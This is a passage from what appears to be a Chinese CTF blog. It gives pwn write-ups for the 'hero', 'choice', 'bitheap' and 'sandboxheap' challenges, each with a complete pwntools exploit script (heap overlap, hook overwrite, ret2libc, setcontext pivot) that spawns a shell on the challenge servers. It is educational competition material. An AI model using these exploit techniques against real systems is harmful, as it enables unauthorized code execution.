class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">3</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%115c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%104c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">6</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">7</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br><br>payload = <span class="hljs-string">b&#x27;quit&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x4005e9</span>) + p64(<span class="hljs-number">0x400903</span>) + p64(bss) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h3><p>在edit函数中有个单字节溢出</p><p><img src="/img/3/Screenshot_20221105_120111.png"></p><p>可以伪造修改下一个堆块的prev_size大小和size尾字节为\x00，在申请释放会本来正常申请的堆块合并。</p><p>最后利用fastbin二次释放，指向malloc_hook，<code>__realloc_hook改为onegadget</code> ， <code>__malloc_hook改为__libc_reallo</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hero&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc_64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./hero&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50005</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x170</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>libc_reallo = libcbase + <span class="hljs-number">0x846c0</span><br>onegadget = libcbase + <span class="hljs-number">0xf1117</span><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">1</span> ,<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(p64(malloc_hook - <span class="hljs-number">0x23</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">11</span> + p64(onegadget) + p64(libc_reallo + <span class="hljs-number">6</span>)<br>add(payload ,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>本地复现环境：2.23-0ubuntu11.3_i386</p><p>在此输入时利用最后一个字节即可覆盖nbytes的值，然后在下一次输入时让其栈溢出，最后ret2libc</p><p><img src="/img/3/Screenshot_20221105_104723.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./choice&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x50&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(<span class="hljs-number">0x80485bb</span>) + p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>leak = u32(p.recv(<span class="hljs-number">4</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>祥云杯2022 sandboxheap和bitheap</title>
    <link href="/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/"/>
    <url>/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/</url>
    
    <content type="html"><![CDATA[<p>我是先写的sandboxheap，开始还以为sandbox文件是多余的，就直接单独拿sandboxheap去写，就在本地打通后，发现远程是有通过sandbox去执行sandboxheap，当时我就没能写出来。</p><p>山重水复疑无路，柳暗花明又一村！没想到bitheap漏洞和sandboxheap一模一样，而且没有sandbox，当时就只写出了bitheap。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这两道题都是一样的漏洞，主要是看懂编辑函数中的溢出和加密：</p><p>如下图将堆块写入数据的大小乘8 ，然后加1；最后是通过基于输入的8个字符去对堆中的一个字节进行位运算，每个字符可以操作堆中一个字节的一位；最后会多出一个字节影响下一个堆块的size</p><p><img src="/img/4/Screenshot_20221105_024929.png"></p><p>如下图sub_C61函数，基于堆块中的字符来位运算，但堆块初始值都是<code>0</code>，最后被写入堆块的也是0  ；如果输入的是<code>\x31</code>字符会让最后被写入堆块的的是1。</p><p><img src="/img/4/Screenshot_20221105_025735.png"></p><h3 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h3><p>kali对这道题使用patchelf会报错，这里我是用ubuntu完成的</p><p>由于溢出的字节只能更改下一个堆块的size的标志位（判断堆块是否被使用），需要对下一个堆块的prev_size和标志位修改，让其释放后进入unsortedbin，然后与上边的unsortedbin合并。</p><img src="/img/4/Screenshot_20221107_060716.png" style="zoom:80%;" /><p>具体写入</p><img src="/img/4/Screenshot_20221107_060903.png" style="zoom:80%;" /><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><p>利用堆块重叠直接去修改__free_hook为system函数即可。</p><p>完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><p>以前都是写调用prctl函数，禁止系统调用开启的沙盒题，但这题目直接使用沙盒程序来保护其它程序。</p><p>利用堆块重叠修改__free_hook到setcontext段上，释放堆块会执行setcontext段上的代码，在此过程中rdi就是被释放堆块堆块的地址，进而劫持rsp。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f5b32c80085</span> &lt;+<span class="hljs-number">53</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa0</span>]<br>   <span class="hljs-number">0x00007f5b32c8008c</span> &lt;+<span class="hljs-number">60</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f5b32c80093</span> &lt;+<span class="hljs-number">67</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f5b32c80097</span> &lt;+<span class="hljs-number">71</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f5b32c8009b</span> &lt;+<span class="hljs-number">75</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f5b32c8009f</span> &lt;+<span class="hljs-number">79</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f5b32c800a3</span> &lt;+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f5b32c800a7</span> &lt;+<span class="hljs-number">87</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa8</span>]<br>   <span class="hljs-number">0x00007f5b32c800ae</span> &lt;+<span class="hljs-number">94</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f5b32c800af</span> &lt;+<span class="hljs-number">95</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f5b32c800b3</span> &lt;+<span class="hljs-number">99</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f5b32c800ba</span> &lt;+<span class="hljs-number">106</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f5b32c800c1</span> &lt;+<span class="hljs-number">113</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f5b32c800c5</span> &lt;+<span class="hljs-number">117</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f5b32c800c9</span> &lt;+<span class="hljs-number">121</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f5b32c800cd</span> &lt;+<span class="hljs-number">125</span>&gt;:<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f5b32c800cf</span> &lt;+<span class="hljs-number">127</span>&gt;:<span class="hljs-keyword">ret</span>    <br></code></pre></td></tr></table></figure><p>最初复现时我想在堆上执行ROP将flag通过orw读出来，但是沙盒程序好像也禁用open之类的系统调用，最后看网上别的师傅写的<a href="https://mp.weixin.qq.com/s/LtC68IafiEA6rAF-cAxb0Q">wp</a>才知道需要通过<code>int 3</code>这个软中断去绕过。</p><h4 id="关于int-3的绕过"><a href="#关于int-3的绕过" class="headerlink" title="关于int 3的绕过"></a>关于int 3的绕过</h4><p>关于int 3的绕过我是看ctftime上关于Sandybox的wp，由于我英语不太好只能理解到这里了。</p><p>sandbox程序fork一个子进程，通过<strong>ptrace</strong>函数跟踪子进程。</p><p>调用ptrace(PTRACE_SYS, pid, 0, signal)使内核在子进程进入和退出系统调用时都将其暂停。</p><p>sandbox程序ida中主要的伪代码（简化）：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">do&#123;<br><span class="hljs-built_in">if </span>( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) == -1<br>|| waitpid(v4, 0LL, 0) == -1<br>|| ptrace(PTRACE_GETREGS, v4, 0LL, v8) == -1 )<br>    &#123;<br>       break;<br>    &#125;<br>    <br>    <br>    ………………<br>    //过滤一些系统调用<br>   ………………<br>   <br>   <br>&#125;while ( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) != -1<br>         &amp;&amp; 